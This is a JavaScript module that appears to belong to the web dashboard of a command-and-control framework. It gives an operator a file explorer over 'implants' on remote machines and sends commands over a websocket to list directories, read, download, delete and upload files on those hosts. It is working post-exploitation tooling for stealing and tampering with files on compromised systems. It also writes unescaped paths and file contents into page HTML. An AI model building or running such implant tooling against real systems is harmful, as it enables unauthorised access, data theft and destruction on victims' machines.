// File Explorer Module
const FileExplorerModule = {
    currentPath: '/',
    currentImplant: null,
    
    init(socket) {
        this.socket = socket;
        this.setupEventListeners();
    },
    
    setupEventListeners() {
        const browseBtn = document.getElementById('browse-files');
        const uploadBtn = document.getElementById('upload-file');
        const backBtn = document.getElementById('navigate-up');
        const refreshBtn = document.getElementById('refresh-files');
        
        if (browseBtn) browseBtn.addEventListener('click', this.browsePath.bind(this));
        if (uploadBtn) uploadBtn.addEventListener('click', this.showUploadDialog.bind(this));
        if (backBtn) backBtn.addEventListener('click', this.navigateUp.bind(this));
        if (refreshBtn) refreshBtn.addEventListener('click', this.refreshCurrentDirectory.bind(this));
        
        // Handle file upload form
        const fileUploadForm = document.getElementById('file-upload-form');
        if (fileUploadForm) {
            fileUploadForm.addEventListener('submit', this.handleFileUpload.bind(this));
        }
        
        // Socket event listeners
        document.addEventListener('socket-message', (event) => {
            const data = event.detail;
            if (data.type === 'directory_listing') {
                this.handleDirectoryListing(data);
            }
            else if (data.type === 'file_content') {
                this.handleFileContent(data);
            }
            else if (data.type === 'file_operation_result') {
                this.handleFileOperationResult(data);
            }
        });
    },
    
    browsePath() {
        const implantId = ImplantsModule.getSelectedImplant();
        if (!implantId) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        this.currentImplant = implantId;
        
        // Get path from input or use current path
        const pathInput = document.getElementById('file-path-input');
        const path = pathInput && pathInput.value ? pathInput.value : this.currentPath;
        
        this.listDirectory(path);
    },
    
    listDirectory(path) {
        if (!this.currentImplant) {
            dashboard.showNotification('No implant selected', 'warning');
            return;
        }
        
        this.socket.send(JSON.stringify({
            type: 'command',
            command: 'list_directory',
            implant_id: this.currentImplant,
            path: path
        }));
        
        // Update UI
        document.getElementById('current-path').textContent = path;
        dashboard.showNotification(`Browsing ${path}...`, 'info');
    },
    
    handleDirectoryListing(data) {
        if (!data.files) {
            dashboard.showNotification('Failed to list directory', 'error');
            return;
        }
        
        this.currentPath = data.path;
        const fileListContainer = document.getElementById('file-list-container');
        if (!fileListContainer) return;
        
        // Update path input
        const pathInput = document.getElementById('file-path-input');
        if (pathInput) pathInput.value = this.currentPath;
        
        // Update file list
        let html = '<table class="table table-hover"><thead><tr>' +
                   '<th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>' +
                   '</tr></thead><tbody>';
                   
        data.files.forEach(file => {
            const isDir = file.type === 'directory';
            const fileIcon = isDir ? 'folder' : 'file';
            const fileSize = isDir ? '-' : this.formatFileSize(file.size);
            
            html += `
                <tr data-path="${file.path}" data-type="${file.type}">
                    <td>
                        <i class="fas fa-${fileIcon} me-2"></i>
                        <span class="file-name">${file.name}</span>
                    </td>
                    <td>${file.type}</td>
                    <td>${fileSize}</td>
                    <td>${file.modified}</td>
                    <td>
                        ${isDir ? '<button class="btn btn-sm btn-primary open-dir">Open</button>' : ''}
                        <button class="btn btn-sm btn-info download-file ${isDir ? 'd-none' : ''}">Download</button>
                        <button class="btn btn-sm btn-danger delete-file">Delete</button>
                    </td>
                </tr>
            `;
        });
        
        html += '</tbody></table>';
        fileListContainer.innerHTML = html;
        
        // Add event listeners to the action buttons
        fileListContainer.querySelectorAll('.open-dir').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const path = e.target.closest('tr').dataset.path;
                this.listDirectory(path);
            });
        });
        
        fileListContainer.querySelectorAll('.download-file').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const path = e.target.closest('tr').dataset.path;
                this.downloadFile(path);
            });
        });
        
        fileListContainer.querySelectorAll('.delete-file').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const path = e.target.closest('tr').dataset.path;
                if (confirm(`Are you sure you want to delete ${path}?`)) {
                    this.deleteFile(path);
                }
            });
        });
        
        // Allow clicking on file names to open directories
        fileListContainer.querySelectorAll('td .file-name').forEach(name => {
            name.addEventListener('click', (e) => {
                const row = e.target.closest('tr');
                const path = row.dataset.path;
                const type = row.dataset.type;
                
                if (type === 'directory') {
                    this.listDirectory(path);
                } else {
                    this.viewFile(path);
                }
            });
        });
    },
    
    navigateUp() {
        if (this.currentPath === '/' || !this.currentImplant) return;
        
        const pathParts = this.currentPath.split('/').filter(p => p);
        pathParts.pop(); // Remove last part
        const parentPath = pathParts.length ? '/' + pathParts.join('/') : '/';
        
        this.listDirectory(parentPath);
    },
    
    refreshCurrentDirectory() {
        if (!this.currentImplant) return;
        this.listDirectory(this.currentPath);
    },
    
    downloadFile(path) {
        if (!this.currentImplant) return;
        
        this.socket.send(JSON.stringify({
            type: 'command',
            command: 'download_file',
            implant_id: this.currentImplant,
            path: path
        }));
        
        dashboard.showNotification(`Downloading ${path}...`, 'info');
    },
    
    viewFile(path) {
        if (!this.currentImplant) return;
        
        this.socket.send(JSON.stringify({
            type: 'command',
            command: 'read_file',
            implant_id: this.currentImplant,
            path: path
        }));
        
        dashboard.showNotification(`Reading ${path}...`, 'info');
    },
    
    deleteFile(path) {
        if (!this.currentImplant) return;
        
        this.socket.send(JSON.stringify({
            type: 'command',
            command: 'delete_file',
            implant_id: this.currentImplant,
            path: path
        }));
        
        dashboard.showNotification(`Deleting ${path}...`, 'info');
    },
    
    showUploadDialog() {
        const modal = document.getElementById('upload-modal');
        if (modal) {
            const modalInstance = new bootstrap.Modal(modal);
            modalInstance.show();
        }
    },
    
    handleFileUpload(e) {
        e.preventDefault();
        
        if (!this.currentImplant) {
            dashboard.showNotification('No implant selected', 'error');
            return;
        }
        
        const fileInput = document.getElementById('file-upload');
        const destinationPath = document.getElementById('upload-destination').value || this.currentPath;
        
        if (!fileInput || !fileInput.files.length) {
            dashboard.showNotification('No file selected', 'warning');
            return;
        }
        
        const file = fileInput.files[0];
        const reader = new FileReader();
        
        reader.onload = (event) => {
            const fileContent = event.target.result.split(',')[1]; // Remove data URL prefix
            
            this.socket.send(JSON.stringify({
                type: 'command',
                command: 'upload_file',
                implant_id: this.currentImplant,
                path: `${destinationPath}/${file.name}`.replace(/\/\//g, '/'),
                content: fileContent,
                file_name: file.name
            }));
            
            // Close modal
            const modal = document.getElementById('upload-modal');
            if (modal) {
                const modalInstance = bootstrap.Modal.getInstance(modal);
                if (modalInstance) modalInstance.hide();
            }
            
            dashboard.showNotification(`Uploading ${file.name}...`, 'info');
        };
        
        reader.readAsDataURL(file);
    },
    
    handleFileContent(data) {
        if (!data.content) {
            dashboard.showNotification('Failed to read file', 'error');
            return;
        }
        
        const fileViewerContainer = document.getElementById('file-viewer-container');
        if (!fileViewerContainer) return;
        
        // Determine file type for syntax highlighting
        const fileExtension = data.path.split('.').pop().toLowerCase();
        const isImage = ['jpg', 'jpeg', 'png', 'gif', 'bmp'].includes(fileExtension);
        const isBinary = ['exe', 'dll', 'bin', 'iso'].includes(fileExtension);
        
        fileViewerContainer.classList.remove('d-none');
        
        if (isImage) {
            fileViewerContainer.innerHTML = `
                <div class="text-center">
                    <h4>Image Preview: ${data.path}</h4>
                    <img src="data:image/${fileExtension};base64,${data.content}" class="img-fluid" alt="Image preview">
                </div>
            `;
        } else if (isBinary) {
            fileViewerContainer.innerHTML = `
                <div class="text-center">
                    <h4>Binary File: ${data.path}</h4>
                    <p>This is a binary file and cannot be displayed in the browser.</p>
                    <a href="data:application/octet-stream;base64,${data.content}" 
                       download="${data.path.split('/').pop()}" 
                       class="btn btn-primary">Download</a>
                </div>
            `;
        } else {
            // Text file viewer with syntax highlighting if possible
            let decodedContent;
            try {
                decodedContent = atob(data.content);
            } catch (e) {
                decodedContent = 'Unable to decode file content';
            }
            
            fileViewerContainer.innerHTML = `
                <div>
                    <h4>File: ${data.path}</h4>
                    <pre><code class="language-${fileExtension}">${decodedContent}</code></pre>
                </div>
            `;
            
            // Initialize syntax highlighting if Prism is available
            if (window.Prism) {
                Prism.highlightAllUnder(fileViewerContainer);
            }
        }
    },
    
    handleFileOperationResult(data) {
        const success = data.success;
        const operation = data.operation;
        
        if (success) {
            dashboard.showNotification(`${operation} completed successfully`, 'success');
            
            // Refresh directory listing after successful operation
            if (['delete_file', 'upload_file'].includes(operation)) {
                this.refreshCurrentDirectory();
            }
        } else {
            dashboard.showNotification(`${operation} failed: ${data.error}`, 'error');
        }
    },
    
    formatFileSize(size) {
        const units = ['B', 'KB', 'MB', 'GB', 'TB'];
        let unitIndex = 0;
        let formattedSize = size;
        
        while (formattedSize >= 1024 && unitIndex < units.length - 1) {
            formattedSize /= 1024;
            unitIndex++;
        }
        
        return `${formattedSize.toFixed(1)} ${units[unitIndex]}`;
    }
}; 